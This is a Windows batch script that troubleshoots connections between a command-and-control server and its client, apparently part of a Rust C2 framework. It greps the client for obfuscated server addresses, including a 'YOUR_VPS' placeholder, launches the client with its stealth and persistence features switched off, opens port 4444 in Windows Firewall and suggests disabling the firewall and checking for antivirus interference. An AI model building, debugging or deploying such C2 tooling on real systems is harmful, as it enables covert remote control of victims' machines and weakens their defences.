@echo off
echo ========================================
echo  C2 Connection Troubleshooting
echo ========================================
echo.

echo [1] Checking current client configuration...
cd /d "%~dp0"

rem Check if client source has the right server IP
echo Current client configuration:
findstr "default_value.*server" c2_client\src\main.rs 2>nul
findstr "obfuscate_string.*192\|obfuscate_string.*127\|obfuscate_string.*YOUR_VPS" c2_client\src\main.rs 2>nul

echo.
echo [2] Checking server status...
netstat -ano | findstr :4444
if %errorlevel% == 0 (
    echo ✅ Server is listening on port 4444
) else (
    echo ❌ No server found on port 4444!
    echo    Start your server first: .\c2_server.exe
    pause
    exit /b 1
)

echo.
echo [3] Testing network connectivity...
set /p TEST_IP="Enter server IP to test (or press Enter for 127.0.0.1): "
if "%TEST_IP%"=="" set TEST_IP=127.0.0.1

echo Testing connection to %TEST_IP%:4444...
telnet %TEST_IP% 4444 2>nul
if %errorlevel% == 0 (
    echo ✅ Network connection successful
) else (
    echo ❌ Cannot connect to %TEST_IP%:4444
    echo    Possible issues:
    echo    - Server not running
    echo    - Firewall blocking connection
    echo    - Wrong IP address
    echo    - Network connectivity issue
)

echo.
echo [4] Checking client processes...
tasklist | findstr c2_client
if %errorlevel% == 0 (
    echo ⚠️  Client processes found running
    echo    Kill old processes: taskkill /f /im c2_client.exe
) else (
    echo ✅ No client processes running
)

echo.
echo [5] Testing client connection...
echo Choose test method:
echo 1. Test with localhost (127.0.0.1)
echo 2. Test with custom IP
echo 3. Test with debug output
echo 4. Check Windows Firewall
echo 5. Kill all processes and restart
choice /c 12345 /n /m "Select option (1-5): "

if %errorlevel%==1 goto test_localhost
if %errorlevel%==2 goto test_custom
if %errorlevel%==3 goto test_debug
if %errorlevel%==4 goto check_firewall
if %errorlevel%==5 goto kill_restart

:test_localhost
echo.
echo Testing client with localhost...
cd output
echo Running: c2_client.exe --server 127.0.0.1 --no-stealth --no-persistence
c2_client.exe --server 127.0.0.1 --no-stealth --no-persistence
goto end

:test_custom
echo.
set /p CUSTOM_IP="Enter server IP: "
echo Testing client with %CUSTOM_IP%...
cd output
echo Running: c2_client.exe --server %CUSTOM_IP% --no-stealth --no-persistence
c2_client.exe --server %CUSTOM_IP% --no-stealth --no-persistence
goto end

:test_debug
echo.
echo Running client in debug mode (shows detailed output)...
cd c2_client
echo Running: cargo run -- --server 127.0.0.1 --no-stealth --no-persistence
cargo run -- --server 127.0.0.1 --no-stealth --no-persistence
goto end

:check_firewall
echo.
echo [INFO] Checking Windows Firewall...
echo Allowing port 4444 through Windows Firewall...
netsh advfirewall firewall add rule name="C2 Test Port" dir=in action=allow protocol=TCP localport=4444 >nul 2>&1
netsh advfirewall firewall add rule name="C2 Test Port Out" dir=out action=allow protocol=TCP localport=4444 >nul 2>&1
echo ✅ Firewall rules added
echo Try connecting again
goto end

:kill_restart
echo.
echo [INFO] Killing all C2 processes...
taskkill /f /im c2_server.exe >nul 2>&1
taskkill /f /im c2_client.exe >nul 2>&1
timeout /t 2 /nobreak >nul

echo [INFO] Starting fresh server...
start "C2 Server" cmd /c "cd /d %~dp0output && c2_server.exe"
timeout /t 3 /nobreak >nul

echo [INFO] Testing client connection...
cd output
c2_client.exe --server 127.0.0.1 --no-stealth --no-persistence
goto end

:end
echo.
echo ========================================
echo  Troubleshooting Complete
echo ========================================
echo.
echo Common Solutions:
echo 1. Make sure server is running: .\c2_server.exe
echo 2. Use correct IP: --server 127.0.0.1 (for local testing)
echo 3. Disable firewall temporarily for testing
echo 4. Kill old processes: taskkill /f /im c2_client.exe
echo 5. Check for antivirus blocking connections
echo.
pause
